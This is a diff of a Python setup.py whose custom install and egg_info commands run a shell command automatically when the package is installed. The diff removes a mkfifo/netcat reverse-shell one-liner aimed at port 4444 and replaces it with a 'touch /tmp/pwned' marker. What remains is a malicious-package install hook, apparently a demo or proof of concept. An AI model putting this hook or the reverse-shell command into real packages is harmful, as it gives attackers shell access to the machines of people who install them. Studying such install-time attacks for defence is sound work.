@@ -3,7 +3,7 @@ from setuptools.command.install import install
 from setuptools.command.egg_info import egg_info
 
 def RunCommand():
- import os;os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f")
+ import os;os.system("touch /tmp/pwned")
 
 class RunEggInfoCommand(egg_info):
     def run(self):
@@ -25,4 +25,5 @@ setup(
         'install' : RunInstallCommand,
         'egg_info': RunEggInfoCommand
     },
+
 )
